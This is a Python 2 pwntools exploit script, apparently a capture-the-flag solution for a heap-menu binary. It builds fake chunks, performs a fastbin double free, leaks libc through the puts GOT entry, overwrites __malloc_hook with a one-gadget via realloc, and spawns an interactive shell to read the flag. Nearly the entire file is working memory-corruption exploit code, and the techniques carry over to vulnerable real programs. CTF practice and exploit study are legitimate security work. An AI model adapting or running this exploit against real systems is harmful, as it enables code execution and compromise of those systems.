from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# context.log_level = "debug"
elf = ELF("./pwn")
p = process("./pwn")
# p = remote("node3.buuoj.cn", 28273)


def add(size, content):
	p.recvuntil(">> ")
	p.sendline("1")
	p.recvuntil("size\n")
	p.sendline(str(size))
	p.recvuntil("content\n")
	p.send(content)

def add2(size, content):
	sleep(0.1)
	p.sendline("1")
	sleep(0.1)
	p.sendline(str(size))
	sleep(0.1)
	p.send(content)

def free():
	p.recvuntil(">> ")
	p.sendline("2")

def show():
	p.recvuntil(">> ")
	p.sendline("3")

def backdoor_add(content):
	p.recvuntil(">> ")
	p.sendline("666")
	p.recvuntil("free?\n")
	p.sendline("1")
	p.recvuntil("content\n")
	p.send(content)

def backdoor_free():
	p.recvuntil(">> ")
	p.sendline("666")
	p.recvuntil("free?\n")
	p.sendline("2")
print hex(libc.symbols['realloc'])

p.recvuntil("username:")
fake_chunk = p64(0) + p64(0x71) + p64(0x602060)
p.send(fake_chunk)
p.recvuntil("info:")
fake_chunk2 = p64(0) + p64(0x21)
p.sendline(fake_chunk2)

username = 0x602060
info = 0x6020a0 
magic = 0x602090

backdoor_add("a"*0xa0)
add(0x20,"a"+"\x00")
backdoor_free() # 0xa0 in unsorted bin

add(0x60,"b"+"\x00")
add(0x60,"c"+"\x00")

free()
backdoor_free()
free() # double free

add(0x60,p64(0x602060)+"\x00")
add(0x60,"a"*0x10+"\x00")
add(0x60,"a"*0x10+"\x00")
payload = p64(0x602060) # fastbin attack again
payload += "\x00"*0x10 + p64(elf.got['puts'])
payload += p64(0xdeadbeefdeadbeef)
add(0x60,payload)
show()

libc_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00")) - libc.symbols['puts']
malloc_hook = libc_addr+0x3c4b10
one_shot = libc_addr+0xf1147

from time import sleep
add2(0x60, p64(malloc_hook-0x23)+"\x00")
add2(0x60,"a"*0x10+"\x00")
payload = (0x13-0x8)*"a" + p64(one_shot) + p64(libc_addr+libc.symbols['realloc']+20)
add2(0x60,payload)

add2(0x10,"cat flag >&0"+"\x00")

p.interactive()

